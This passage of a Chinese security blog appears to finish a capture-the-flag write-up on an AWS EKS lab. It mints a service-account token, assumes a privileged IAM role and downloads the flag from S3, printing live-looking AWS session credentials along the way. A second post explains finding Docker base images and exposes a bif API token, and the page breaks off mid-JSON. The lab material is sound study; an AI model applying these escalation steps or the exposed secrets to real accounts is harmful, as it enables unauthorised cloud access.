<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20231228203726812.png" alt="image-20231228203726812"></p>
<p>查看serviceaccount</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20231228203746071.png" alt="image-20231228203746071"></p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">items:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line">  <span class="attr">kind:</span> <span class="string">ServiceAccount</span></span><br><span class="line">  <span class="attr">metadata:</span></span><br><span class="line">    <span class="attr">annotations:</span></span><br><span class="line">      <span class="attr">description:</span> <span class="string">This</span> <span class="string">is</span> <span class="string">a</span> <span class="string">dummy</span> <span class="string">service</span> <span class="string">account</span> <span class="string">with</span> <span class="string">empty</span> <span class="string">policy</span> <span class="string">attached</span></span><br><span class="line">      <span class="attr">eks.amazonaws.com/role-arn:</span> <span class="string">arn:aws:iam::688655246681:role/challengeTestRole-fc9d18e</span></span><br><span class="line">    <span class="attr">creationTimestamp:</span> <span class="string">&quot;2023-10-31T20:07:37Z&quot;</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">debug-sa</span></span><br><span class="line">    <span class="attr">namespace:</span> <span class="string">challenge5</span></span><br><span class="line">    <span class="attr">resourceVersion:</span> <span class="string">&quot;671929&quot;</span></span><br><span class="line">    <span class="attr">uid:</span> <span class="string">6cb6024a-c4da-47a9-9050-59c8c7079904</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line">  <span class="attr">kind:</span> <span class="string">ServiceAccount</span></span><br><span class="line">  <span class="attr">metadata:</span></span><br><span class="line">    <span class="attr">creationTimestamp:</span> <span class="string">&quot;2023-10-31T20:07:11Z&quot;</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">default</span></span><br><span class="line">    <span class="attr">namespace:</span> <span class="string">challenge5</span></span><br><span class="line">    <span class="attr">resourceVersion:</span> <span class="string">&quot;671804&quot;</span></span><br><span class="line">    <span class="attr">uid:</span> <span class="string">77bd3db6-3642-40d5-b8c1-14fa1b0cba8c</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line">  <span class="attr">kind:</span> <span class="string">ServiceAccount</span></span><br><span class="line">  <span class="attr">metadata:</span></span><br><span class="line">    <span class="attr">annotations:</span></span><br><span class="line">      <span class="attr">eks.amazonaws.com/role-arn:</span> <span class="string">arn:aws:iam::688655246681:role/challengeEksS3Role</span></span><br><span class="line">    <span class="attr">creationTimestamp:</span> <span class="string">&quot;2023-10-31T20:07:34Z&quot;</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">s3access-sa</span></span><br><span class="line">    <span class="attr">namespace:</span> <span class="string">challenge5</span></span><br><span class="line">    <span class="attr">resourceVersion:</span> <span class="string">&quot;671916&quot;</span></span><br><span class="line">    <span class="attr">uid:</span> <span class="string">86e44c49-b05a-4ebe-800b-45183a6ebbda</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">List</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">resourceVersion:</span> <span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p>查看secrets</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20231228203814364.png" alt="image-20231228203814364"></p>
<p>从上述服务帐户得出的结果，</p>
<p>- 附加到 SA“debug-sa”的 IAM 角色是challengeTestRole-fc9d18e</p>
<p>- 附加到 SA “s3access-sa”的IAM角色是challengeEksS3Role</p>
<p>只允许为“debug-sa”创建token（通过运行“kubectl auth can-i — list”来识别），并且需要承担challengeEksS3Role来获取我们的flag，我们可以通过web身份验证的方式来创建。</p>
<h4 id="5-6-为debug-sa创建token并获取权限"><a href="#5-6-为debug-sa创建token并获取权限" class="headerlink" title="5.6 为debug-sa创建token并获取权限"></a>5.6 为debug-sa创建token并获取权限</h4><p>创建token（注意这里需要指定audience之前有提到，这是策略生效的前提）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">debugsatoken=$(kubectl create token debug-sa --audience=sts.amazonaws.com)</span><br></pre></td></tr></table></figure>

<p>设置 AWS CLI web身份验证（注意这里的IAM角色需要指定为challengeEksS3Role）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws sts assume-role-with-web-identity --web-identity-token $debugsatoken --role-arn arn:aws:iam::688655246681:role/challengeEksS3Role --role-session-name hacked</span><br></pre></td></tr></table></figure>

<p>设置环境变量（根据上一条指令返回的结果）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> AWS_ACCESS_KEY_ID=ASIA2AVYNEVMXISURJO2</span><br><span class="line"><span class="built_in">export</span> AWS_SECRET_ACCESS_KEY=xYjl4N8DiuiBQY8wlndh7nJESeg/oUHFxVfJbBcw</span><br><span class="line"><span class="built_in">export</span> AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEDUaCXVzLXdlc3QtMSJGMEQCIEQzKvzrEE3D62jc+bkhhI4gzyYYHoeuZkFrDXCdL44XAiB78MAlAbk5MpTlgoioZF4QD2GOIeJ05XlWuiAoVRy03SrABAi+//////////8BEAAaDDY4ODY1NTI0NjY4MSIMrgWnIMgZ8Q4Kg+sWKpQEUhXDLq0Yu3DPW/TemlVwpSu2BBKFUNNV7d+xgJk6DqCd6YcryXyyW1jAl5ycf6tWQiUTq6M8nadEE1piS2Uafl8laOpMvPnykVqrtIsb0Du6lDDIPssHBmqDn8b682FqxOI8Yo4HfpnsXCxDV655k94An5ilkDaZ7+YKo3Vn++ovr/ntm2HkCc8l2cCm2kmkWxIa8+qmymHe2rDecq368nd2MDD0XjDFMoXJZswgHSCPpT98/rXXC1BaSazivslVNispb6CgQe5e7IBAA0ggp3rKvzmfiWkMLqh5+Bd3cbqjl/4Jf7UzjthaWmhpX3Fz/4XooJQYmFP7gchyD8epb8g7KT2umN0/gqvSw2JzFHn9pSexjPo3npyMkbaKR3Z0fmidCaMx5+rmiVsDp/S+QtSXe/pFV6RMlJLXlFFICp9fjQ4L1bEBJFJqJrUSfIKIm5V7JvgThSsuXrd6OnZMGSqOUUjPD9v0cRrz3BpT7vRdMDJRJ8eqze0/Z90Z38Z1in7bG6QHPzoBmqmGnPH9+5L363DXQo1r4HWdQM8ZZqbVCRItUlLXdpaVTjiR4I0P6pZrrUjPFtxG/Vju6UwDdeTqqGsp11j/hTItPKwE5TNT0Ey/rdBxgFhgqIV3jdjqxpGOqLd8KE8ID7er9Bx9KazY2oTsFURG3vdoQ0cpnsE2aa84/4vvWZ1/TYgQtPD579G+8jC33rWsBjqWAfBIVjz4k5/bvDn+imLRw7fC93ko49up5DTj+wJYPmHUSZpYo1RhGzxFU1iemWTbI2VnuEiEf1x/UKp+RmbahEiFyvnuUglSOK/+/x2IGTSWPZC+yo1uXNOzxOAS3A8GWvwr0DxaG1/r0ahZU2ZABw4kdt+WZRXcsIgGtW1Hg34mzoQhfTPzwfmSfltvPAv1DRKpArkk/g==</span><br></pre></td></tr></table></figure>

<h4 id="5-7-获取存储bucket中的flag"><a href="#5-7-获取存储bucket中的flag" class="headerlink" title="5.7 获取存储bucket中的flag"></a>5.7 获取存储bucket中的flag</h4><p>查看我的角色</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws sts get-caller-identity</span><br></pre></td></tr></table></figure>

<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;UserId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AROA2AVYNEVMZEZ2AFVYI:hacked&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Account&quot;</span><span class="punctuation">:</span> <span class="string">&quot;688655246681&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Arn&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:sts::688655246681:assumed-role/challengeEksS3Role/hacked&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>下载flag</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws s3 <span class="built_in">cp</span> s3://challenge-flag-bucket-3ff1ae2/flag .</span><br></pre></td></tr></table></figure>

<h2 id="6-参考文献"><a href="#6-参考文献" class="headerlink" title="6. 参考文献"></a>6. 参考文献</h2><p><a target="_blank" rel="noopener" href="https://blog.aquasec.com/the-ticking-supply-chain-attack-bomb-of-exposed-kubernetes-secrets">暴露kubernetes秘密的滴答作响的供应链攻击炸弹</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/379293478">浅谈云上攻防之-元数据服务带来的安全挑战</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/andresriancho/enumerate-iam/tree/master">aws的iam权限探测脚本</a></p>
</p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2023-12-30</span><i class="fa fa-tag"></i><a class="tag" href="/tags/容器安全/" title="容器安全">容器安全 </a><span class="leancloud_visitors"></span><span>大约3975个字, 13分钟15秒读完</span></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2023/11/27/%E5%9F%BA%E7%A1%80%E9%95%9C%E5%83%8F/">基础镜像</a></h3></div><div class="post-content"><div class="card"><p><p><a href="https://phoenixmerk.github.io/"><img src="https://img.shields.io/badge/%E4%BD%9C%E8%80%85-Sally-blue.svg" alt="img"></a></p>
<h1 id="一、研究调研"><a href="#一、研究调研" class="headerlink" title="一、研究调研"></a>一、研究调研</h1><h2 id="1-1-调研工作"><a href="#1-1-调研工作" class="headerlink" title="1.1 调研工作"></a>1.1 调研工作</h2><h3 id="什么是基础镜像？"><a href="#什么是基础镜像？" class="headerlink" title="什么是基础镜像？"></a>什么是基础镜像？</h3><p>基础镜像是 Docker 镜像的起点，它是一个只读的文件系统。基础镜像通常包含了一个最小化的操作系统，以及一些预装的基础软件包。Docker Hub 提供了许多常用的基础镜像，如 Ubuntu、Alpine 等。这些镜像是由 Docker 官方或社区维护的，可以在 Docker Hub 上自由获取和使用。</p>
<h3 id="手动查看基础镜像"><a href="#手动查看基础镜像" class="headerlink" title="手动查看基础镜像"></a>手动查看基础镜像</h3><ul>
<li><p>查看docker history</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">history</span> calico/cni:v3.13.1</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image3.png" alt="image3"></p>
</li>
<li><p>查看docker inspect</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker inspect 6912ec2cfae6</span><br></pre></td></tr></table></figure>

<p>有部分镜像会在label中写出基础镜像，但有的没有</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image2.jpg" alt="image2"></p>
<p>有部分镜像会在parent中写出基础镜像，但有的没有</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image1.png" alt="image1"></p>
</li>
</ul>
<h3 id="layers发现基础镜像的方法"><a href="#layers发现基础镜像的方法" class="headerlink" title="layers发现基础镜像的方法"></a>layers发现基础镜像的方法</h3><p>Docker 镜像是由一系列只读的文件系统层构成的，这些层会按特定顺序叠加在一起，构成一个完整的镜像。镜像层的设计使得 Docker 具有轻量、高效和可复用的特性。下面是 Docker 镜像层构成的详细介绍：</p>
<ul>
<li>基础镜像层：</li>
</ul>
<p>Docker 镜像的第一层是基础镜像层，它通常包含一个最小化的操作系统，如Alpine Linux、Ubuntu、CentOS等。这个基础镜像提供了运行应用程序所需的最基本的文件和工具。基础镜像通常是公共或私有的，供其他镜像构建和扩展使用。</p>
<ul>
<li>应用程序依赖层：</li>
</ul>
<p>在基础镜像之上，Docker 可以添加应用程序的依赖项和运行时环境，这些依赖项可能包括软件包、库文件等。这些层用于支持应用程序的执行和运行所需的软件和工具。</p>
<ul>
<li>应用程序代码层：</li>
</ul>
<p>在依赖层之上，Docker 可以添加应用程序的实际代码和资源文件。这些层包含了应用程序的源代码、配置文件、静态资源等。这使得 Docker 镜像能够完整地包含应用程序的所有代码。</p>
<ul>
<li>只读层：</li>
</ul>
<p>镜像的每个层都是只读的，这意味着在构建后，镜像层的内容不会再改变。这种设计有助于镜像的高效性和可复用性。如果需要修改镜像，Docker 将在现有层之上创建新的镜像层，保持原有层的完整性。</p>
<ul>
<li>共享相同层：</li>
</ul>
<p>当多个镜像共享相同的基础层时，它们可以节省存储空间和下载时间。因为这些镜像只需在自己的特定层上添加差异层，而不是复制整个基础镜像。这使得镜像的存储和传输变得更加高效。</p>
<ul>
<li>镜像的唯一标识：</li>
</ul>
<p>每个镜像都有一个唯一的标识符，称为镜像 ID，它是根据镜像内容生成的哈希值。镜像 ID 是根据所有镜像层的内容计算得出的，即使一个镜像只有一个小的改动，它的镜像 ID 也会发生变化。这种特性有助于确保镜像的唯一性和数据的完整性。</p>
<h4 id="查看docker-history中最下方添加的file信息"><a href="#查看docker-history中最下方添加的file信息" class="headerlink" title="查看docker history中最下方添加的file信息"></a>查看docker history中最下方添加的file信息</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">history</span> runctaoyi:v1.0 --no-trunc</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/layer2.png" alt="layer2"></p>
<h4 id="查看docker-hub中对应file信息"><a href="#查看docker-hub中对应file信息" class="headerlink" title="查看docker hub中对应file信息"></a>查看docker hub中对应file信息</h4><p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/dockerhub.png" alt="dockerhub"></p>
<h3 id="寻找宿主机中镜像实际文件系统"><a href="#寻找宿主机中镜像实际文件系统" class="headerlink" title="寻找宿主机中镜像实际文件系统"></a>寻找宿主机中镜像实际文件系统</h3><p><strong>layerID：</strong></p>
<p>压缩后的哈希，和diffID有一一映射关系</p>
<p><strong>diffID：</strong></p>
<p>解压缩后的哈希，使用docker inspect可以查看到</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/file.png" alt="file"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/var/lib/docker/image/overlay2/distribution/diffid-by-digest/sha256</span><br><span class="line"><span class="comment"># 存放diffID -&gt; layerID 正向查询，以文件名进行查询</span></span><br><span class="line">/var/lib/docker/image/overlay2/distribution/v2metadata-by-diffid/sha256</span><br><span class="line"><span class="comment"># 存放layerID -&gt; diffID 反向查询，以文件名进行查询</span></span><br></pre></td></tr></table></figure>

<p><strong>chainID：</strong></p>
<ul>
<li>如果layer是最底层，没有任何父layer，那么 <strong>diffID &#x3D; chainID</strong></li>
<li>否则，<strong>chainID(n)&#x3D;sha256sum(chainID(n-1)) diffID(n))</strong></li>
</ul>
<p><strong>cacheID:</strong></p>
<p>我们想要的第一层layer刚好没有任何父layer，所以diffID&#x3D;chainID，访问&#x2F;var&#x2F;lib&#x2F;docker&#x2F;image&#x2F;overlay2&#x2F;layerdb&#x2F;sha256&#x2F;{chainID}&#x2F;cache-id文件可以获取cache-id</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/file1.png" alt="file1"></p>
<p>我们想要获取的镜像&#x2F;etc&#x2F;os-release文件在宿主机的真实路径表现为&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;{cache-id}&#x2F;diff&#x2F;etc&#x2F;os-release</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /var/lib/docker/overlay2/&#123;cache-id&#125;/diff/etc/os-release</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/file2.png" alt="file2"></p>
<h3 id="利用镜像文件系统查看基础镜像"><a href="#利用镜像文件系统查看基础镜像" class="headerlink" title="利用镜像文件系统查看基础镜像"></a>利用镜像文件系统查看基础镜像</h3><p>在manifest.json文件中找到第一个layer的文件名，进入tar包并查看&#x2F;etc&#x2F;os-release文件，能够获取基础镜像信息</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/find.jpg" alt="find"></p>
<h2 id="1-2-bif开源工具"><a href="#1-2-bif开源工具" class="headerlink" title="1.2 bif开源工具"></a>1.2 bif开源工具</h2><ul>
<li>维护了一个基础镜像查询服务器输入镜像名来查询基础镜像</li>
</ul>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/code.jpg" alt="code"></p>
<ul>
<li>运行命令和截图</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bif find --image us-docker.pkg.dev/fairwinds-ops/oss/polaris:7.0.0 --insights-oss-token  cde4be88-d5a6-4cbb-ae0f-0f4653724623</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/bif.jpg" alt="bif"></p>
<ul>
<li>调用API</li>
</ul>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET https://bif-server-6biex2p5nq-uc.a.run.app/base?image_tag=&#123;完整镜像名&#125;</span><br><span class="line"># headers中需要加入一个认证字段</span><br><span class="line"><span class="attribute">Authorization</span><span class="punctuation">: </span>Bearer &#123;你的token&#125;</span><br></pre></td></tr></table></figure>

<p>提交请求后返回json信息</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;image_repository&quot;</span><span class="punctuation">:</span> <span class="string">&quot;us-docker.pkg.dev/fairwinds-ops/oss/polaris&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;image_tag&quot;</span><span class="punctuation">:</span> <span class="string">&quot;7.0.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;image_platform&quot;</span><span class="punctuation">:</span> <span class="string">&quot;linux/amd64&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;base_images&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;image_repository&quot;</span><span class="punctuation">:</span> <span class="string">&quot;alpine&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;image_tag&quot;</span><span class="punctuation">:</span> <span class="string">&quot;3.16.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;vulnerabilities&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CVE-2022-2097&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;severity&quot;</span><span class="punctuation">:</span> <span class="string">&quot;MEDIUM&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;cvss&quot;</span><span class="punctuation">:</span> <span class="number">5.3</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CVE-2022-30065&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;severity&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HIGH&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;cvss&quot;</span><span class="punctuation">:</span> <span class="number">7.8</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CVE-2022-37434&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;severity&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CRITICAL&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;cvss&quot;</span><span class="punctuation">:</span> <span class="number">9.8</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CVE-2022-4304&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;severity&quot;</span><span class="punctuation">:</span> <span class="string">&quot;MEDIUM&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;cvss&quot;</span><span class="punctuation">:</span> <span class="number">5.9</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CVE-2022-4450&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;severity&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HIGH&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;cvss&quot;</span><span class="punctuation">:</span> <span class="number">7.5</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CVE-2023-0215&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;severity&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HIGH&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;cvss&quot;</span><span class="punctuation">:</span> <span class="number">7.5</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CVE-2023-0286&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;severity&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HIGH&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;cvss&quot;</span><span class="punctuation">:</span> <span class="number">7.4</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CVE-2023-0464&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;severity&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UNKNOWN&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CVE-2023-0465&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;severity&quot;</span><span class="punctuation">:</span> <span class="string">&quot;MEDIUM&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CVE-2023-2650&quot;</span><span 